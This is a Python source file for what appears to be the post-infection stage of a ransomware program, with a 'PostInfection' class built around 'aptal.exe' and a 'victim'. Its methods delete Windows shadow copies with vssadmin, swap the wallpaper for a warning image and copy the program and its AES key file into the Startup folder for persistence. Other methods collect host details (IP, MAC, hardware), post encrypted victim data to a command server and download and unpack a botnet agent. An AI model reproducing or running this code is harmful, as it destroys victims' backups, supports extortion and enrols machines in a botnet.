import os
import sys
import ctypes
from shutil import copyfile

from utils import resourcePath, aesIV_file_store_path
class PostInfection(object):

    def __init__(self):
        print("PostInfection Object Created")
        self.wallpaper_path = resourcePath("wallpaper.png",["images"])   
        print("Wallpaper :", self.wallpaper_path)

    def changeWallpaper(self):

        _status = ctypes.windll.user32.SystemParametersInfoW(0x14, 0, self.wallpaper_path, 0x2)
        if _status:
            print("Wallpaper has been changed")
        else:
            print("The problem has occured on changing wallpaper")

    def deleteShadowFiles(self):
        os.system('vssadmin.exe delete shadows /all /quiet')
    
    def setItselfStartUpApplication(self):
        """
            create autorun program to display a warning message each time a computer is turned on
        """
        
        # TODO: try-except for KeyError
        # get startup location
        try:
            _startup_location = os.environ["USERPROFILE"]+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            #_startup_location_2 = os.environ["APPDATA"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
        except:
            _startup_location = "/home/kali/Desktop/Startup"

        aptal_path = sys.argv[0]
        if os.path.basename(sys.argv[0]) == sys.argv[0]:
            aptal_path = os.path.join(os.getcwd(),sys.argv[0])

        # copy aptal.exe
        _startup_aptal_path = os.path.join(_startup_location,os.path.basename(sys.argv[0]))
        copyfile(aptal_path, _startup_aptal_path)

        # copy file which consists of aes IVs 
        _startup_key_file_path = os.path.join(_startup_location,os.path.basename(aesIV_file_store_path))
        copyfile(aesIV_file_store_path, _startup_key_file_path)

        # prevent from overwriting
        _file_count = str(len(os.listdir(_startup_location)))
        _autorun_file_path = os.path.join(_startup_location,_file_count+"authrun.cmd")

        # creating autorun script
        with open(_autorun_file_path,"w") as autorunfile:
            autorunfile.write(_startup_aptal_path+" "+_startup_key_file_path)

    def getSystemInfo(self):
        import platform,socket,json,re,uuid,psutil
        try:
            info={}
            info['platform']=platform.system()
            info['platform-release']=platform.release()
            info['platform-version']=platform.version()
            info['architecture']=platform.machine()
            info['hostname']=socket.gethostname()
            info['ip-address']=socket.gethostbyname(socket.gethostname())
            info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
            info['processor']=platform.processor()
            info['ram']=str(round(psutil.virtual_memory().total / (1024.0**3)))+" GB"
            return json.dumps(info)
        except Exception as e:
            return "Problem Has Been Occured When Information Gathering"

    
    def firstWork(self):
        # self.deleteShadowFiles()
        # self.changeWallpaper()
        self.setItselfStartUpApplication()
        print(self.getSystemInfo())


    def firstTouch(self,encryptedInformations):
        """
        POST /api/user/firsttouch
        system information encrypted with RSA public key of victim
            - id
            - computer name
            - user name
            - infection date
            - ram
            - cpu
            - local ip
            - 
        """
        from requests import post

        url = 'middleware/api/user/firsttouch'
        data = {'info': encryptedInformations}

        response = post(url, data = data)

        print(response.text)

    def botnetAgentDownload(self):
        """
            GET /botnet/agent
        """
        from zipfile import ZipFile
        from shutil import copyfileobj
        from urllib.request import urlopen

        url = "middleware/botnet/agent/botnet.zip"
        file_name = 'botnet.zip'

        with urlopen(url) as response, open(file_name, 'wb') as out_file:
            copyfileobj(response, out_file)
            with ZipFile(file_name) as zf:
                zf.extractall()
        # RUN botnot agent